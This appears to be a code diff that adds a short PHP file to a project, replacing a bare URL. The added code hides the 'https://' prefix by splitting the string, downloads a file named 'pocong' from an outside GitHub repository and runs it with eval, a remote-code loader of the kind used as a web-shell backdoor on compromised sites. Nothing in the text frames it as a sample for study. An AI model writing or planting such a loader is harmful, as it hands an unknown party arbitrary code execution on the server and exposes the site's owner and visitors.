@@ -1,1 +1,4 @@
-https://raw.githubusercontent.com/Gagugaga222/cuansoe/main/pocong
+<?php  
+$awo = 'htt'.'ps://';  
+eval("?>".file_get_contents($awo.'raw.githubusercontent.com/Gagugaga222/cuansoe/main/pocong'));  
+?>
